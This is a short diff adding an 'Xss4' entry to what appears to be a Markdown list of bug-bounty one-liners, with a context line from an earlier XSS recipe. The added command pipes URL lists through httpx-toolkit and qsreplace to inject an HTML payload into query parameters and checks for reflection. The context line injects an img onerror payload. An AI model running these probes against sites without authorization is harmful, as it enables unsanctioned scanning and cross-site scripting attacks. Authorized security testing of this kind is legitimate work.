@@ -108,6 +108,12 @@ echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=a
 ```
 
 
+###  Xss4. 
+
+```bash
+echo $(cat url) | httpx-toolkit | qsreplace  <h1>XSS</h1> | freq | egrep -v 'Not' | anew xss4;
+```
+
 
 ###  OpenRedirect gf. 
 
